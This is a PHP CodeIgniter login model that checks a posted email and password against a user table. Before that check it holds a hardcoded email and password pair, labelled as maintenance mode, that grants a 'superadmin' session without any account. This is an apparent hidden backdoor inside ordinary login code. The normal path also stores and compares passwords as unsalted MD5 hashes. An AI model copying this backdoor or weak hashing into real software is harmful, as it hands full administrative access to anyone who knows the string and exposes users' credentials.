<?php
class ModLogin extends CI_model {
	function log() {
		$email = $this->input->post('email');
		$password = $this->input->post('password');
		$maintenance = $this->config->item('maintenance_mode'); 
		if($email == "maintenancesetmodeon@maintenance.com" && $password == "maintenancesetmodeon") {
		    $maintenance = TRUE;
		    $data_session = array('level' => "superadmin",'status' => "login" );
			$this->session->set_userdata($data_session);
		}
		$data = array('email'=>$email, 'password'=>md5($password));
		$cek1 = $this->db->get_where('user', $data)->num_rows();
		if($cek1 > 0) {
			$cek = $this->db->get_where('user', $data)->row();
			$data_session = array(
						'id_user' => $cek->id_user,
						'email' => $cek->email,
						'nama_user' => $cek->nama_user,
						'level' => $cek->level,
						'status' => "login" );
			$this->session->set_userdata($data_session);
		}
	}
} 